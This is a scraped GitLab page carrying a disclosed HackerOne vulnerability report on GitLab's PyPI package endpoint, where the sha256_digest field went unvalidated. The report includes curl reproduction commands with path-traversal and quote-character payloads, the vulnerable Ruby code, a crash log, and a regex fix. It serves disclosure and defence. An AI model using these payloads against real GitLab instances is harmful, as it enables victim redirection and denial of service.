=== Content from gitlab.com_23b8f4e6_20250108_140837.html ===


[Skip to content](#content-body)
GitLab
[Next](https://next.gitlab.com)

* Menu

  + [Why GitLab](https://about.gitlab.com/why-gitlab)
  + [Pricing](https://about.gitlab.com/pricing)
  + [Contact Sales](https://about.gitlab.com/sales)
  + [Explore](/explore)
* [Why GitLab](https://about.gitlab.com/why-gitlab)
* [Pricing](https://about.gitlab.com/pricing)
* [Contact Sales](https://about.gitlab.com/sales)
* [Explore](/explore)

* [Sign in](/users/sign_in?redirect_to_referer=yes)
* [Get free trial](/users/sign_up)

* [cves](/gitlab-org/cves/-/tree/master)
* [2022](/gitlab-org/cves/-/tree/master/2022)
* [**CVE-2022-1431.json**](/gitlab-org/cves/-/blob/master/2022/CVE-2022-1431.json)

Find file

[Blame](/gitlab-org/cves/-/blame/master/2022/CVE-2022-1431.json)
[Permalink](/gitlab-org/cves/-/blob/c6a6f86828227186d5080abce4d5f88d42571ec9/2022/CVE-2022-1431.json "Go to permalink <kbd class='flat ml-1' aria-hidden=true>y</kbd>")

* [![🤖 GitLab Bot 🤖's avatar](/uploads/-/system/user/avatar/1786152/avatar.png?width=64 "🤖 GitLab Bot 🤖")](/gitlab-bot)

  May 09, 2022

  [6fec2616](/gitlab-org/cves/-/commit/6fec261656369269fe37b5550c4f6d58377da244)
  [Publishing 0 updated advisories and 2 new advisories](/gitlab-org/cves/-/commit/6fec261656369269fe37b5550c4f6d58377da244)
  ·
  6fec2616

  [🤖 GitLab Bot 🤖](/gitlab-bot) authored May 09, 2022

  6fec2616

  [Publishing 0 updated advisories and 2 new advisories](/gitlab-org/cves/-/commit/6fec261656369269fe37b5550c4f6d58377da244)
  [🤖 GitLab Bot 🤖](/gitlab-bot) authored May 09, 2022

Loading



=== Content from gitlab.com_42434a2c_20250108_140838.html ===


[Skip to content](#content-body)
GitLab
[Next](https://next.gitlab.com)

* Menu

  + [Why GitLab](https://about.gitlab.com/why-gitlab)
  + [Pricing](https://about.gitlab.com/pricing)
  + [Contact Sales](https://about.gitlab.com/sales)
  + [Explore](/explore)
* [Why GitLab](https://about.gitlab.com/why-gitlab)
* [Pricing](https://about.gitlab.com/pricing)
* [Contact Sales](https://about.gitlab.com/sales)
* [Explore](/explore)

* [Sign in](/users/sign_in?redirect_to_referer=yes)
* [Get free trial](/users/sign_up)

# Forging GET Requests through and Denying Service of Simple PyPi API Endpoint

**[HackerOne report #996850](https://hackerone.com/reports/996850)** by `iwis` on 2020-10-03, assigned to [@ankelly](/ankelly "Andrew Kelly"):

[Report](#report)

## Report

##### Summary

The simple PyPi API endpoint of GitLab is vulnerable to stored XSS and DoS through the `sha256_digest` parameter of package files. This allows an attacker to forge `GET` requests within the domain of `gitlab.com` or a self-hosted GitLab instance on the behalf of a victim and deny the service of said simple PyPi API endpoint to users. This vulnerability applies to both, `gitlab.com` and self-hosted GitLab instances and requires user interaction (i.e, a single click).

##### Steps to reproduce

1. Create a new project or refer to an existing project with the package registry enabled ([by default](https://docs.gitlab.com/ee/user/packages/package_registry/#disable-the-package-registry), the package registry is enabled).
2. Create a PyPi package by uploading a package file through GitLab's API:

   ```
   curl -v &#34;https://__token__:$PAT@gitlab.com/api/v4/projects/$PROJECT/packages/pypi&#34; -F content=&#39;@/tmp/help&#39; -F requires_python=3.8 -F version=1 -F name=&#39;totally_innocent_package&#39; -F sha256_digest=&#39;../../../../../../..&#39;
   ```

   with `$PAT` being your personal access token and `$PROJECT` being the ID of the targeted project.
3. Visit: `https://gitlab.com/api/v4/projects/21471488/packages/pypi/simple/totally_innocent_package`.
4. Click on the link `help`.
5. Observe being redirected to `gitlab.com/help`.

*Note*: the project I use in this example is only visible to me, please let me know if you want me to change that.

##### Impact

This vulnerability can mislead a user to think that they download a package file by clicking on its link, whereas they will be directed to another resource on the same domain. Especially with self-hosted GitLab instances [on a relative URL](https://docs.gitlab.com/omnibus/settings/configuration.html#configuring-a-relative-url-for-gitlab) (e.g., `example.com/gitlab`), the attacker can route the victim to a malicious, possibly attacker-controlled, resource (e.g., a phishing website). Secondly, injecting unallowed characters into the URL's path leads to a status code `500` on the simple PyPi API endpoint, effectively denying service for users (refer to an example of that below).

##### Examples

The exemplary project in the reproduction steps illustrates how to route a victim to another resource. I have verified that these steps also apply to a self-hosted GitLab instance with the latest version of GitLab, i.e., 13.4.2.

###### Denial of Service

1. Create a package file through GitLab's API:

   ```
   curl -v &#34;https://__token__:$PAT@gitlab.com/api/v4/projects/$PROJECT/packages/pypi&#34; -F content=&#39;@/tmp/denial-of-service&#39; -F requires_python=3.8 -F version=1 -F name=&#39;totally_innocent_package&#39; -F sha256_digest=&#39;&#34;&#39;
   ```

   with `$PAT` being your personal access token and `$PROJECT` being the ID of the targeted project.
2. Visit: `https://gitlab.com/api/v4/projects/21471488/packages/pypi/simple/totally_innocent_package`.
3. Observe the response being `{&#34;message&#34;:&#34;500 Internal Server Error&#34;}`.

*Note*: it is still possible to download the package files through `https://gitlab.com/dpfuerst/xss-through-pypi-repository/-/packages/562993`.

##### What is the current *bug* behavior?

Uploading a file to GitLab via

```
curl -v &#34;https://__token__:$PAT@gitlab.com/api/v4/projects/$PROJECT/packages/pypi&#34; -F content=&#39;@/tmp/help&#39; -F requires_python=3.8 -F version=1 -F name=&#39;totally_innocent_package&#39; -F sha256_digest=&#39;../../../../../../..&#39;
```

triggers [the PyPi Package upload endpoint](https://gitlab.com/gitlab-org/gitlab/-/blob/976f5ff8c158aab1c4459cc225508ceb6c5e5b74/lib/api/pypi_packages.rb#L107-136):

```
desc &#39;The PyPi Package upload endpoint&#39; do
  detail &#39;This feature was introduced in GitLab 12.10&#39;
end

params do
  requires :content, type: ::API::Validations::Types::WorkhorseFile, desc: &#39;The package file to be published (generated by Multipart middleware)&#39;
  requires :requires_python, type: String
  requires :name, type: String
  requires :version, type: String
  optional :md5_digest, type: String
  optional :sha256_digest, type: String
end

route_setting :authentication, deploy_token_allowed: true, basic_auth_personal_access_token: true, job_token_allowed: :basic_auth
post do
  authorize_upload!(authorized_user_project)
  bad_request!(&#39;File is too large&#39;) if authorized_user_project.actual_limits.exceeded?(:pypi_max_file_size, params[:content].size)

  track_package_event(&#39;push_package&#39;, :pypi)

  ::Packages::Pypi::CreatePackageService
    .new(authorized_user_project, current_user, declared_params)
    .execute

  created!
rescue ObjectStorage::RemoteStoreError =&gt; e
  Gitlab::ErrorTracking.track_exception(e, extra: { file_name: params[:name], project_id: authorized_user_project.id })

  forbidden!
end
```

and allows submitting [an optional parameter `sha256_digest`](https://gitlab.com/gitlab-org/gitlab/-/blob/976f5ff8c158aab1c4459cc225508ceb6c5e5b74/lib/api/pypi_packages.rb#L117) that is not subject to any validation. In turn, the package presenter for PyPi packages takes the `sha256_digest` and [builds the `href` attribute](https://gitlab.com/gitlab-org/gitlab/-/blob/976f5ff8c158aab1c4459cc225508ceb6c5e5b74/app/presenters/packages/pypi/package_presenter.rb#L53-64) of the package file links without any validation:

```
def build_pypi_package_path(file)
  expose_url(
    api_v4_projects_packages_pypi_files_file_identifier_path(
      {
        id: [@]project.id,
        sha256: file.file_sha256,
        file_identifier: file.file_name
      },
      true
    )
  ) + &#34;#sha256=#{file.file_sha256}&#34;
end
```

If `sha256_digest` contains characters that are not valid in the context of an absolute path [as defined in RFC 3986](https://tools.ietf.org/html/rfc3986#appendix-A), [`expose_url`](https://gitlab.com/gitlab-org/gitlab/-/blob/976f5ff8c158aab1c4459cc225508ceb6c5e5b74/lib/api/helpers/related_resources_helpers.rb#L20-30) will fail due to [`URI::Generic.build`](https://gitlab.com/gitlab-org/gitlab/-/blob/976f5ff8c158aab1c4459cc225508ceb6c5e5b74/lib/api/helpers/related_resources_helpers.rb#L29) rejecting the invalid absolute path:

```
{
  &#34;time&#34;: &#34;2020-10-03T00:11:48.302Z&#34;,
  &#34;severity&#34;: &#34;INFO&#34;,
  &#34;duration_s&#34;: 0.0208,
  &#34;db_duration_s&#34;: 0.00359,
  &#34;view_duration_s&#34;: 0.01721,
  &#34;status&#34;: 500,
  &#34;method&#34;: &#34;GET&#34;,
  &#34;path&#34;: &#34;/api/v4/projects/[REDACTED]/packages/pypi/simple/totally_innocent_package&#34;,
  &#34;params&#34;: [],
  &#34;host&#34;: &#34;[REDACTED]&#34;,
  &#34;remote_ip&#34;: &#34;[REDACTED]&#34;,
  &#34;ua&#34;: &#34;[REDACTED]&#34;,
  &#34;route&#34;: &#34;/api/:version/projects/:id/packages/pypi/simple/*package_name&#34;,
  &#34;user_id&#34;: [REDACTED],
  &#34;username&#34;: &#34;[REDACTED]&#34;,
  &#34;exception.class&#34;: &#34;URI::InvalidComponentError&#34;,
  &#34;exception.message&#34;: &#34;bad component(expected absolute path component): /api/v4/projects/[REDACTED]/packages/pypi/files/\"/denial-of-service&#34;,
  &#34;exception.backtrace&#34;: [
    &#34;lib/api/helpers/related_resources_helpers.rb:29:in `expose_url&#39;&#34;,
    &#34;app/presenters/packages/pypi/package_presenter.rb:54:in `build_pypi_package_path&#39;&#34;,
    &#34;app/presenters/packages/pypi/package_presenter.rb:40:in `block (2 levels) in links&#39;&#34;,
    &#34;app/presenters/packages/pypi/package_presenter.rb:39:in `block in links&#39;&#34;,
    &#34;app/presenters/packages/pypi/package_presenter.rb:38:in `map&#39;&#34;,
    &#34;app/presenters/packages/pypi/package_presenter.rb:38:in `links&#39;&#34;,
    &#34;app/presenters/packages/pypi/package_presenter.rb:27:in `body&#39;&#34;,
    &#34;lib/api/pypi_packages.rb:104:in `block (3 levels) in &lt;class:PypiPackages&gt;&#39;&#34;,
    &#34;ee/lib/gitlab/middleware/ip_restrictor.rb:14:in `block in call&#39;&#34;,
    &#34;ee/lib/gitlab/ip_address_state.rb:10:in `with&#39;&#34;,
    &#34;ee/lib/gitlab/middleware/ip_restrictor.rb:13:in `call&#39;&#34;,
    &#34;lib/gitlab/request_profiler/middleware.rb:17:in `call&#39;&#34;,
    &#34;lib/gitlab/jira/middleware.rb:19:in `call&#39;&#34;,
    &#34;lib/gitlab/middleware/go.rb:20:in `call&#39;&#34;,
    &#34;lib/gitlab/etag_caching/middleware.rb:13:in `call&#39;&#34;,
    &#34;lib/gitlab/middleware/multipart.rb:217:in `call&#39;&#34;,
    &#34;lib/gitlab/middleware/read_only/controller.rb:51:in `call&#39;&#34;,
    &#34;lib/gitlab/middleware/read_only.rb:18:in `call&#39;&#34;,
    &#34;lib/gitlab/middleware/same_site_cookies.rb:27:in `call&#39;&#34;,
    &#34;lib/gitlab/middleware/basic_health_check.rb:25:in `call&#39;&#34;,
    &#34;lib/gitlab/middleware/handle_ip_spoof_attack_error.rb:25:in `call&#39;&#34;,
    &#34;lib/gitlab/middleware/request_context.rb:23:in `call&#39;&#34;,
    &#34;config/initializers/fix_local_cache_middleware.rb:9:in `call&#39;&#34;,
    &#34;lib/gitlab/metrics/requests_rack_middleware.rb:60:in `call&#39;&#34;,
    &#34;lib/gitlab/middleware/release_env.rb:12:in `call&#39;&#34;
  ],
  &#34;queue_duration_s&#34;: 0.004383,
  &#34;redis_calls&#34;: 1,
  &#34;redis_duration_s&#34;: 0.000169,
  &#34;redis_read_bytes&#34;: 331,
  &#34;redis_write_bytes&#34;: 870,
  &#34;redis_shared_state_calls&#34;: 1,
  &#34;redis_shared_state_duration_s&#34;: 0.000169,
  &#34;redis_shared_state_read_bytes&#34;: 331,
  &#34;redis_shared_state_write_bytes&#34;: 870,
  &#34;correlation_id&#34;: &#34;[REDACTED]&#34;,
  &#34;meta.user&#34;: &#34;[REDACTED]&#34;,
  &#34;meta.caller_id&#34;: &#34;/api/:version/projects/:id/packages/pypi/simple/*package_name&#34;
}
```

##### What is the expected *correct* behavior?

Uploading a file to GitLab via

```
curl -v &#34;https://__token__:$PAT@gitlab.com/api/v4/projects/$PROJECT/packages/pypi&#34; -F content=&#39;@/tmp/help&#39; -F requires_python=3.8 -F version=1 -F name=&#39;totally_innocent_package&#39; -F sha256_digest=&#39;../../../../../../..&#39;
```

should restrict the value that `sha256_digest` can take to

```
SHA256_REGEX = /\A[0-9a-f]{64}\z/i.freeze
```

and provide a corresponding error in the case of a violation.

*Note*: the same probably applies to the optional parameter `md5_digest`, although I believe that the lack of a restriction does currently not pose a vulnerability.

##### Relevant logs and/or screenshots

*N/A*

##### Output of checks

This bug happens on `gitlab.com` and self-hosted GitLab instances.

###### Results of GitLab environment info

```
System information
System:		Ubuntu 16.04
Proxy:		no
Current User:	git
Using RVM:	no
Ruby Version:	2.6.6p146
Gem Version:	2.7.10
Bundler Version:1.17.3
Rake Version:	12.3.3
Redis Version:	5.0.9
Git Version:	2.28.0
Sidekiq Version:5.2.9
Go Version:	unknown

GitLab information
Version:	13.4.2-ee
Revision:	34869f45ee8
Directory:	/opt/gitlab/embedded/service/gitlab-rails
DB Adapter:	PostgreSQL
DB Version:	11.7
URL:		[REDACTED]
HTTP Clone URL:	[REDACTED]
SSH Clone URL:	[REDACTED]
Elasticsearch:	no
Geo:		no
Using LDAP:	no
Using Omniauth:	yes
Omniauth Providers:

GitLab Shell
Version:	13.7.0
Repository storage paths:
- default: 	[REDACTED]
GitLab Shell path:		/opt/gitlab/embedded/service/gitlab-shell
Git:		/opt/gitlab/embedded/bin/git
```

#### Impact

This vulnerability can mislead a user to think that they download a package file by clicking on its link, whereas they will be directed to another resource on the same domain. Especially with self-hosted GitLab instances [on a relative URL](https://docs.gitlab.com/omnibus/settings/configuration.html#configuring-a-relative-url-for-gitlab) (e.g., `example.com/gitlab`), the attacker can route the victim to a malicious, possibly attacker-controlled, resource (e.g., a phishing website). Secondly, injecting unallowed characters into the URL's path leads to a status code `500` on the simple PyPi API endpoint, effectively denying service for users.

Edited Oct 06, 2020 by [Andrew Kelly](/ankelly)

Assignee
Loading

Time tracking
Loading

Confidentiality

Confidentiality controls have moved to the issue actions menu () at the top of the page.


